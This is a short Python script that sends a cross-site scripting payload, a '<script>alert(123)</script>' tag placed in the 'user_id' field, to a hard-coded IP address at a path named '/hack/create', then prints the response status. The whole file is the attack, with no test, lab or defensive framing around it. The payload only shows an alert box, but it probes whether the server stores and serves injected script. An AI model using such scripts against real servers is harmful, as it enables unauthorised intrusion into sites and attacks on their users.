import requests
r = requests.post("http://212.193.27.248:443/hack/create", data={"user_id":"<script>alert(123)</script>"})
print(r.status_code, r.reason)